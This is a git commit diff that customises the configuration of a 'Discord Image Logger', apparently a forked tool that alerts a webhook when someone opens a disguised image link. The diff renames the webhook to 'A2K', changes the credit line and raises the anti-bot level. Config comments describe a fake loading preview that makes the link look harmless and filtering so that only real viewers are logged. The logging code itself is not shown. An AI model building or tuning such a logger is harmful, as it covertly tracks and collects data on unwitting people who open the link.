e99d1e5b60abc70f334c4a271ec17bf0f1c4f885
xyzcuff <cuff@privatemx.org>
2025-07-05 17:30:02 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -1,6 +1,5 @@
 
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# Discord Image Logger | https://github.com/xyzcuff
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -19,7 +18,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "A2K", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -41,7 +40,7 @@ config = {
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 1, # Prevents bots from triggering the alert
+    "antiBot": 3, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
                 # 1 = Don't ping when it's possibly a bot
                 # 2 = Don't ping when it's 100% a bot
